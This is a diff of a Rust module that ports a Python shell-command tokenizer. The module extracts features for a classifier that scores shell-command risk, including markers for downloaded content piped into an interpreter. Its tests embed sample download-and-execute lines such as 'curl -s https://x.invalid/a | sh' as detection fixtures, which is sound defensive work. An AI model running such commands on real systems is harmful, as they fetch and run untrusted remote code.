@@ -1,24 +1,18 @@
-// SPDX-License-Identifier: GPL-3.0-only
-//! Rust port of the `shell_tokens.py` analyzer shipped with the
-//! `cat-shell-risk-commander` A1 (`format_version: 2`) model.
+// SPDX-License-Identifier: MIT OR Apache-2.0
+//! The live shell-token part of the K26 `kf1` analyzer: a port of
+//! `shellrisk/tokens.py` from the `cat-shell-risk-commander` release.
 //!
-//! The model adds a second TF-IDF feature block whose analyzer is a
-//! deterministic shell tokenizer: it splits on whitespace and shell operators,
+//! A deterministic shell tokenizer splits on whitespace and shell operators,
 //! normalizes volatile pieces (quoted strings, URLs, IPs, numbers) to stable
 //! placeholders, and emits unigrams, adjacent bigrams and three structural
-//! markers (command head, pipe target, redirect target). This lets the scorer
-//! tell `curl | jq` from `curl | sh` without ever executing the text.
+//! markers (command head, pipe target, redirect target). Relation markers from
+//! a small, depth-limited parse of the same tokens say whether downloaded
+//! content flows into an interpreter, is executed as a file, or only reaches a
+//! file or a pure filter (see [`relations`]). Heredoc bodies that are code
+//! for another interpreter are masked first.
 //!
-//! Since issue #159 the analyzer also appends relation markers from a small,
-//! depth-limited parse of the same tokens: does downloaded content flow into an
-//! interpreter (pipe, process/command substitution, `-c` script, PowerShell
-//! `iex`), is a downloaded file executed, or does it only reach a file or a
-//! pure filter? See [`relations`].
-//!
-//! This port is bit-exact with the Python reference: `features` here returns
-//! the same multiset of feature strings as `shell_tokens.features` there, which
-//! is all the downstream TF-IDF vectorizer consumes. The text is never parsed,
-//! expanded or run.
+//! `features` returns the same multiset of feature strings as the Python
+//! reference. The text is never parsed, expanded or run.
 
 use std::borrow::Cow;
 
@@ -102,15 +96,17 @@ fn next_char_len(text: &str, index: usize) -> usize {
     text[index..].chars().next().map_or(1, char::len_utf8)
 }
 
-/// Split `text` into tokens, matching `shell_tokens.tokens` (the Python
-/// `TOKEN.findall`). Alternatives are tried in the Python order; an unmatched
-/// character (stray quote, whitespace) is skipped.
+/// `TOKEN.findall(text)`: the line tokens without the newline tokens.
+#[cfg(test)]
 fn tokenize(text: &str) -> Vec<&str> {
-    tokenize_with(text, TokenMode::Plain)
+    let mut tokens = line_tokens(text);
+    tokens.retain(|token| *token != "\n");
+    tokens
 }
 
 /// `re.findall(r'\n|' + TOKEN.pattern, text)`: the tokens plus each newline as
-/// its own token, the word stream of the K26 marker and facts code.
+/// its own token. Alternatives are tried in the Python order; an unmatched
+/// character (stray quote, whitespace) is skipped.
 pub(crate) fn line_tokens(text: &str) -> Vec<&str> {
     tokenize_with(text, TokenMode::Lines)
 }
@@ -118,8 +114,6 @@ pub(crate) fn line_tokens(text: &str) -> Vec<&str> {
 /// Which leading alternatives precede the Python `TOKEN` pattern.
 #[derive(Clone, Copy, PartialEq, Eq)]
 enum TokenMode {
-    /// `TOKEN` alone.
-    Plain,
     /// `\n|TOKEN`: a newline is its own token (a command separator).
     Lines,
     /// `STRUCT_TOKEN`, used by [`relations`]: `<NAME>` placeholders stay one
@@ -133,21 +127,19 @@ fn tokenize_with(text: &str, mode: TokenMode) -> Vec<&str> {
     let mut pos = 0;
     while pos < bytes.len() {
         let byte = bytes[pos];
-        if mode != TokenMode::Plain {
-            // `<[A-Za-z_][A-Za-z0-9_-]*>`
-            if mode == TokenMode::Structural {
-                if let Some(end) = scan_placeholder(bytes, pos) {
-                    tokens.push(&text[pos..end]);
-                    pos = end;
-                    continue;
-                }
-            }
-            // `\n`
-            if byte == b'\n' {
-                tokens.push(&text[pos..pos + 1]);
-                pos += 1;
+        // `<[A-Za-z_][A-Za-z0-9_-]*>`
+        if mode == TokenMode::Structural {
+            if let Some(end) = scan_placeholder(bytes, pos) {
+                tokens.push(&text[pos..end]);
+                pos = end;
                 continue;
             }
+        }
+        // `\n`
+        if byte == b'\n' {
+            tokens.push(&text[pos..pos + 1]);
+            pos += 1;
+            continue;
         }
         // Whitespace is never a token; skip the whole character.
         let first = text[pos..].chars().next().unwrap();
@@ -310,32 +302,34 @@ fn is_number(token: &str) -> bool {
 }
 
 /// Normalize one raw token, matching `shell_tokens.normalise`.
-fn normalise(token: &str) -> String {
+fn normalise(token: &str) -> Cow<'_, str> {
     if is_operator(token) || is_fd_redirect(token) {
-        return token.to_string();
+        return Cow::Borrowed(token);
     }
     let first = token.as_bytes()[0];
     if (first == b'\'' || first == b'"') && token.chars().count() > 1 {
-        return "<STR>".to_string();
+        return Cow::Borrowed("<STR>");
     }
     if is_url(token) {
-        return "<URL>".to_string();
+        return Cow::Borrowed("<URL>");
     }
     if is_ipv4(token) {
-        return "<IP>".to_string();
+        return Cow::Borrowed("<IP>");
     }
     if is_hostport(token) {
-        return "<HOSTPORT>".to_string();
+        return Cow::Borrowed("<HOSTPORT>");
     }
     if is_number(token) {
-        return if token.starts_with('-') {
+        return Cow::Borrowed(if token.starts_with('-') {
             "-<NUM>"
         } else {
             "<NUM>"
-        }
-        .to_string();
+        });
     }
-    token.to_lowercase()
+    if token.is_ascii() && !token.bytes().any(|b| b.is_ascii_uppercase()) {
+        return Cow::Borrowed(token);
+    }
+    Cow::Owned(token.to_lowercase())
 }
 
 /// Command name without its directory, e.g. `/usr/bin/python3` -> `python3`.
@@ -441,54 +435,6 @@ fn heredoc_writes_code_file(line: &str, from: usize) -> bool {
         }
     }
     false
-}
-
-/// A complete simple heredoc delimiter at `k`: (end, delimiter, quoted).
-/// Mixed quoted/escaped words are left unmasked instead of accepting a prefix.
-fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str, bool)> {
-    let bytes = line.as_bytes();
-    if !line[k..].starts_with("<<") {
-        return None;
-    }
-    let mut pos = k + 2;
-    if bytes.get(pos) == Some(&b'-') {
-        pos += 1;
-    }
-    while matches!(bytes.get(pos), Some(b' ' | b'\t')) {
-        pos += 1;
-    }
-    let quote = match bytes.get(pos) {
-        Some(&q @ (b'\'' | b'"')) => {
-            pos += 1;
-            Some(q)
-        }
-        _ => None,
-    };
-    let start = pos;
-    while pos < line.len() {
-        let c = line[pos..].chars().next()?;
-        if quote.is_some_and(|q| c == char::from(q))
-            || (quote.is_none() && is_heredoc_word_end(c))
-            || c == '\\'
-        {
-            break;
-        }
-        pos += c.len_utf8();
-    }
-    if pos == start {
-        return None;
-    }
-    let delimiter = &line[start..pos];
-    let end = match quote {
-        Some(q) if bytes.get(pos) == Some(&q) => pos + 1,
-        Some(_) => return None,
-        None => pos,
-    };
-    // Never accept a prefix of a mixed quoted/escaped delimiter word.
-    if !is_heredoc_boundary(line, end) {
-        return None;
-    }
-    Some((end, delimiter, quote.is_some()))
 }
 
 /// Top-level command segments as (start, end), splitting on `; | & && ||` outside any
@@ -598,35 +544,9 @@ fn heredoc_head_masks(head: &str, segment: &str) -> bool {
         || (matches!(head, "cat" | "tee") && heredoc_writes_code_file(segment, 0))
 }
 
-/// Delimiter of the first `<<` heredoc on `line` whose owning command feeds a non-shell
-/// interpreter, or is a cat/tee writing a code or data file. Mirrors `heredoc_delimiter`.
-fn heredoc_delimiter(line: &str) -> Option<(&str, bool)> {
-    let segments: Vec<(usize, usize, String)> = heredoc_segments(line)
-        .into_iter()
-        .map(|(s, e)| (s, e, heredoc_segment_head(&line[s..e])))
-        .collect();
-    let mut k = 0;
-    while k < line.len() {
-        if let Some((end, delimiter, quoted)) = heredoc_op_at(line, k) {
-            let masks = !line[..k].ends_with('<')
-                && segments.iter().any(|(s, e, head)| {
-                    *s <= k && k < *e && !head.is_empty() && heredoc_head_masks(head, &line[*s..*e])
-                });
-            if masks {
-                return Some((delimiter, quoted));
-            }
-            k = end;
-            continue;
-        }
-        k += line[k..].chars().next().map_or(1, char::len_utf8);
-    }
-    None
-}
-
-/// The K26 `HEREDOC_OP` at `k`, `<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1`:
-/// (match end, delimiter). Unlike the released analyzer it needs no boundary
-/// after the delimiter word and takes identifier delimiters only.
-fn heredoc_op_k26(line: &str, k: usize) -> Option<(usize, &str)> {
+/// `HEREDOC_OP` at `k`, `<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1`:
+/// (match end, delimiter). Identifier delimiters only, no boundary after them.
+fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str)> {
     let bytes = line.as_bytes();
     if !line[k..].starts_with("<<") {
         return None;
@@ -665,22 +585,25 @@ fn heredoc_op_k26(line: &str, k: usize) -> Option<(usize, &str)> {
     }
 }
 
-/// First K26 `HEREDOC_OP` match in `line` (`HEREDOC_OP.search`): (start, delimiter).
-pub(crate) fn heredoc_op_search_k26(line: &str) -> Option<(usize, &str)> {
+/// First `HEREDOC_OP` match in `line` (`HEREDOC_OP.search`): (start, delimiter).
+pub(crate) fn heredoc_op_search(line: &str) -> Option<(usize, &str)> {
     line.match_indices("<<")
-        .find_map(|(k, _)| heredoc_op_k26(line, k).map(|(_, delimiter)| (k, delimiter)))
+        .find_map(|(k, _)| heredoc_op_at(line, k).map(|(_, delimiter)| (k, delimiter)))
 }
 
-/// K26 `heredoc_delimiter`: the first `<<` heredoc whose owning command feeds a
+/// `heredoc_delimiter`: the first `<<` heredoc whose owning command feeds a
 /// non-shell interpreter or is a cat/tee writing a code or data file.
-pub(crate) fn heredoc_delimiter_k26(line: &str) -> Option<&str> {
+pub(crate) fn heredoc_delimiter(line: &str) -> Option<&str> {
+    if !line.contains("<<") {
+        return None;
+    }
     let segments: Vec<(usize, usize, String)> = heredoc_segments(line)
         .into_iter()
         .map(|(s, e)| (s, e, heredoc_segment_head(&line[s..e])))
         .collect();
     let mut k = 0;
     while k < line.len() {
-        if let Some((end, delimiter)) = heredoc_op_k26(line, k) {
+        if let Some((end, delimiter)) = heredoc_op_at(line, k) {
             let masks = !line[..k].ends_with('<')
                 && segments.iter().any(|(s, e, head)| {
                     *s <= k && k < *e && !head.is_empty() && heredoc_head_masks(head, &line[*s..*e])
@@ -696,7 +619,7 @@ pub(crate) fn heredoc_delimiter_k26(line: &str) -> Option<&str> {
     None
 }
 
-/// K26 `mask_heredocs` with a pluggable delimiter finder: every body line up to
+/// `mask_heredocs` with a pluggable delimiter finder: every body line up to
 /// the terminator becomes one `heredoc_body` line, right after the opening line.
 pub(crate) fn mask_heredocs_with<'a>(
     text: &'a str,
@@ -724,67 +647,42 @@ pub(crate) fn mask_heredocs_with<'a>(
     Cow::Owned(out.join("\n"))
 }
 
-/// Replace heredoc bodies that are code (see above) by one `heredoc_body` line.
-/// Matches `shell_tokens.mask_heredocs` of the released (G) analyzer.
-pub fn mask_heredocs(text: &str) -> Cow<'_, str> {
-    if !text.contains("<<") {
-        return Cow::Borrowed(text);
-    }
-    let mut out: Vec<&str> = Vec::new();
-    let mut lines = text.split('\n').peekable();
-    while let Some(line) = lines.next() {
-        out.push(line);
-        if let Some((delimiter, quoted)) = heredoc_delimiter(line) {
-            let mut body = Vec::new();
-            while let Some(&next) = lines.peek() {
-                if next.trim_matches([' ', '\t', '\r']) == delimiter {
-                    break;
-                }
-                body.push(lines.next().unwrap());
-            }
-            // Unquoted heredocs expand commands even when feeding Python or a data file.
-            // Keep the entire body so multiline substitutions remain visible to relations().
-            if !quoted && body.iter().any(|line| line.contains(['$', '`'])) {
-                out.extend(body);
-            } else {
-                out.push(HEREDOC_MASK);
-            }
-            if let Some(close) = lines.next() {
-                out.push(close);
-            }
-        }
-    }
-    Cow::Owned(out.join("\n"))
+/// Replace heredoc bodies that are code by one `heredoc_body` line
+/// (`tokens.mask_heredocs`).
+pub(crate) fn mask_heredocs(text: &str) -> Cow<'_, str> {
+    mask_heredocs_with(text, heredoc_delimiter)
 }
 
-/// The deterministic shell-token features of `text`, as a multiset in the same
-/// shape the Python `shell_tokens.features` produces (unigrams, adjacent
-/// bigrams, the `CMD=`, `PIPE->` and `REDIR->` structural markers, then the
-/// `DL->` relation markers), after [`mask_heredocs`].
-pub fn features(text: &str) -> Vec<String> {
-    features_of(&mask_heredocs(text))
-}
-
-/// [`features`] with the K26 heredoc masking (`shellrisk/tokens.py`), the live
-/// token part of the `kf1` analyzer.
-pub fn features_k26(text: &str) -> Vec<String> {
-    features_of(&mask_heredocs_with(text, heredoc_delimiter_k26))
-}
-
-/// Unigrams, bigrams, structural and relation markers of already masked text.
-fn features_of(text: &str) -> Vec<String> {
-    let norm: Vec<String> = tokenize(text).into_iter().map(normalise).collect();
-
-    // Unigrams first, then bigrams and markers, in the reference order.
-    let mut extra = Vec::with_capacity(norm.len() * 2);
+/// The deterministic shell-token features from the line tokens of a masked text,
+/// as a multiset in the shape of the Python `tokens.features` (unigrams,
+/// adjacent bigrams, the `CMD=`, `PIPE->` and `REDIR->` structural markers,
+/// then the `DL->` relation markers of the masked text). The live token part
+/// of `kf1`.
+pub(crate) fn visit_features(
+    line_tokens: &[&str],
+    relations: &[&'static str],
+    emit: &mut dyn FnMut(&str),
+) {
+    // `TOKEN.findall`: the line tokens without the newline tokens.
+    let norm: Vec<Cow<'_, str>> = line_tokens
+        .iter()
+        .filter(|token| **token != "\n")
+        .map(|token| normalise(token))
+        .collect();
+    norm.iter().for_each(|value| emit(value));
+    let mut buffer = String::new();
+    let mut joined = |emit: &mut dyn FnMut(&str), parts: &[&str]| {
+        buffer.clear();
+        parts.iter().for_each(|part| buffer.push_str(part));
+        emit(&buffer);
+    };
     for pair in norm.windows(2) {
-        extra.push(format!("{} {}", pair[0], pair[1]));
+        joined(emit, &[&pair[0], " ", &pair[1]]);
     }
-
     let mut at_start = true;
     let mut after: Option<&str> = None;
     for value in &norm {
-        let value = value.as_str();
+        let value: &str = value;
         if is_operator(value) || is_fd_redirect(value) {
             at_start = matches!(value, "|" | "||" | "&&" | ";" | "&" | "(" | "$(");
             after = match value {
@@ -797,29 +695,23 @@ fn features_of(text: &str) -> Vec<String> {
             continue;
         }
         match after {
-            Some("|") => extra.push(format!("PIPE->{}", head(value))),
-            Some(">") | Some(">>") => {
-                let target = if value == "/dev/null" {
-                    "/dev/null"
-                } else if value.starts_with("/dev/") {
-                    "<DEV>"
-                } else {
-                    "<FILE>"
-                };
-                extra.push(format!("REDIR->{target}"));
-            }
+            Some("|") => joined(emit, &["PIPE->", head(value)]),
+            Some(">") | Some(">>") => emit(if value == "/dev/null" {
+                "REDIR->/dev/null"
+            } else if value.starts_with("/dev/") {
+                "REDIR-><DEV>"
+            } else {
+                "REDIR-><FILE>"
+            }),
             _ => {}
         }
         if at_start {
-            extra.push(format!("CMD={}", head(value)));
+            joined(emit, &["CMD=", head(value)]);
         }
         at_start = false;
         after = None;
     }
-    let mut out = norm;
-    out.append(&mut extra);
-    out.extend(relations(text).into_iter().map(str::to_string));
-    out
+    relations.iter().for_each(|relation| emit(relation));
 }
 
 // ---- Relation markers (issue #159): does a download flow into an interpreter? ----
@@ -1360,13 +1252,23 @@ pub fn relations(text: &str) -> Vec<&'static str> {
 mod tests {
     use super::*;
 
+    /// `tokens.features`: mask, tokenize, featurize.
+    fn features(text: &str) -> Vec<String> {
+        let masked = mask_heredocs(text);
+        let mut out = Vec::new();
+        visit_features(&line_tokens(&masked), &relations(&masked), &mut |f| {
+            out.push(f.to_string())
+        });
+        out
+    }
+
     fn feats(text: &str) -> Vec<String> {
         features(text)
     }
 
     #[test]
     fn matches_python_reference_cases() {
-        // Golden outputs captured from `shell_tokens.features` (A1 + issue #159).
+        // Golden outputs captured from `tokens.features`.
         assert_eq!(feats("ls -la"), ["ls", "-la", "ls -la", "CMD=ls"]);
         assert_eq!(
             feats("curl -fsSL https://example.com/i.sh | jq ."),
@@ -1699,57 +1601,30 @@ mod tests {
     }
 
     #[test]
-    fn heredoc_expansions_and_full_delimiters_preserve_executable_relations() {
-        for (name, text, masked, relation) in [
+    fn masked_heredoc_bodies_still_reach_relations_of_the_raw_text() {
+        // The token block masks these bodies like the reference; the facts read
+        // `relations` of the raw command, so a download into an interpreter
+        // stays visible to the policies.
+        for (text, masked) in [
             (
-                "unquoted_command",
                 "python3 - <<PY\n$(curl -s https://x.invalid/a | sh)\nPY",
-                false,
                 true,
             ),
             (
-                "unquoted_multiline",
-                "python3 - <<PY\n$(\ncurl -s https://x.invalid/a | sh\n)\nPY",
-                false,
-                true,
-            ),
-            (
-                "unquoted_backtick",
                 "cat > cfg.json <<EOF\n`curl -s https://x.invalid/a | sh`\nEOF",
-                false,
                 true,
             ),
             (
-                "punctuated_delimiter",
                 "python3 - <<EOF-END\nprint(1)\nEOF-END\ncurl -s https://x.invalid/a | sh",
                 true,
-                true,
             ),
             (
-                "quoted_punctuation",
                 "python3 - <<'EOF.END'\nprint(1)\nEOF.END\ncurl -s https://x.invalid/a | sh",
-                true,
-                true,
-            ),
-            (
-                "literal_substitution",
-                "python3 - <<'PY'\n$(curl -s https://x.invalid/a | sh)\nPY",
-                true,
-                false,
-            ),
-            (
-                "literal_backtick",
-                "cat > cfg.json <<\"EOF\"\n`curl -s https://x.invalid/a | sh`\nEOF",
-                true,
                 false,
             ),
         ] {
-            assert_eq!(mask_heredocs(text).contains(HEREDOC_MASK), masked, "{name}");
-            assert_eq!(
-                features(text).iter().any(|f| f == "DL->PIPE->INTERP"),
-                relation,
-                "{name}"
-            );
+            assert_eq!(mask_heredocs(text).contains(HEREDOC_MASK), masked, "{text}");
+            assert!(relations(text).contains(&"DL->PIPE->INTERP"), "{text}");
         }
     }
 }
